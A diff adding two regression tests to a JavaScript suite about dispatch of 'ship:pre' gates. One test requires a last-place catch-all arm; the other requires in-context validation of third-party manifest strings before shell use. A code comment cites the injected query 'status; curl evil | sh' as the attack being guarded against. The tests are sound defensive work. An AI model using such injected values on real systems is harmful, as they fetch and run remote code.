@@ -416,6 +416,70 @@ describe('ship:pre gate dispatch contract (#3559)', () => {
     assert.match(region, /blocking\s*==\s*false/, 'preflight must treat a non-blocking gate as advisory, never a halt');
   });
 
+  test('[regression] a catch-all arm handles every capId the named branches do not, and comes last', () => {
+    const region = preflightRegion();
+
+    // Adversarial-review finding: asserting only that the shared loop phrase and the
+    // evaluator substrings CO-OCCUR somewhere in the region is too weak. A partial
+    // regression that keeps the loop phrase but deletes the default arm — leaving prose
+    // that merely name-drops `gsd_run check predicate` and the onError/blocking words —
+    // would satisfy those assertions while silently reintroducing #3559. The load-bearing
+    // structure is a distinguishable DEFAULT branch, positioned after every named one.
+    const catchAll = region.search(/\*\*Every other `capId`\*\*/);
+    assert.notStrictEqual(
+      catchAll,
+      -1,
+      'preflight must carry an explicit catch-all arm for every capId the named branches do not ' +
+      'handle. Without it, dispatch is still an allowlist no matter how the loop is worded (#3559).',
+    );
+
+    const capIdSelectors = [...region.matchAll(/capId\s*==\s*"([a-z0-9-]+)"/g)];
+    for (const match of capIdSelectors) {
+      assert.ok(
+        catchAll > match.index,
+        `the catch-all arm must come AFTER the named "${match[1]}" branch — a default placed ` +
+        'before a specialization would swallow it, changing that gate\'s established semantics.',
+      );
+    }
+
+    // The catch-all is the arm that must reach the generic evaluator; a default branch that
+    // does not evaluate anything is the bug wearing a different shape.
+    const evaluatorAt = region.search(/gsd_run check predicate --predicate/);
+    assert.ok(
+      evaluatorAt > catchAll,
+      'the generic predicate evaluator must be invoked from inside the catch-all arm, not merely ' +
+      'mentioned somewhere earlier in the step',
+    );
+  });
+
+  test('[security] the third-party check arm mandates in-context validation before any shell use', () => {
+    const region = preflightRegion();
+
+    // #3559 made ship:pre reach THIRD-PARTY manifest strings for the first time — dispatch
+    // previously never left the two first-party arms. `gates[].check` is not one of the four
+    // executable surfaces the install consent prompt discloses (hooks, command modules,
+    // mcpServers, reviewer lanes), so a capability can be consented to as declarative-only
+    // and still reach a shell here. The dispatch prose must therefore carry the same
+    // in-context validation contract loop-hook-dispatch.md already mandates for
+    // `ref.command`. If this instruction is ever dropped, a manifest `check.query` of
+    // `status; curl evil | sh` is interpolated straight into a command substitution.
+    assert.match(
+      region,
+      /\^\[a-z\]\[a-z0-9-\]\*\( \[a-z\]\[a-z0-9-\]\*\)\*\$/,
+      'the named-query arm must pin the exact charset a manifest-supplied query is validated against',
+    );
+    assert.match(
+      region,
+      /IN-CONTEXT/,
+      'validation must be specified as in-context, never by pasting the value into a shell to be tested there',
+    );
+    assert.match(
+      region,
+      /single argv element/,
+      'the predicate arm must be passed as one argument, never re-quoted into a shell string',
+    );
+  });
+
   test('every capId named in ship:pre preflight declares a ship:pre gate in the registry', () => {
     const region = preflightRegion();
 
